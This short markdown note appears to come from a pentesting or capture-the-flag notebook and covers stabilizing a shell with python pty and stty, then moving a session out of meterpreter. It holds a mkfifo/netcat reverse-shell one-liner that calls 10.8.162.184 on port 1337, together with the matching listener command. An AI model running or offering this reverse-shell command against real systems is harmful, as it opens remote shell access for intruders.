For the [Shell Stabilization](Shell%20Stabilization.md) first we need to execute `export TERM=xterm` then `python3 -c 'import pty;pty.spawn("/bin/bash")'` then ctrl+z and `stty raw -echo;fg` and reset + enter .

## Transfer shell from meterpreter 

- On the unstable shell `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.8.162.184 1337 >/tmp/f`
- On attacking system `nc -lvnp 1337`

then Stabilize.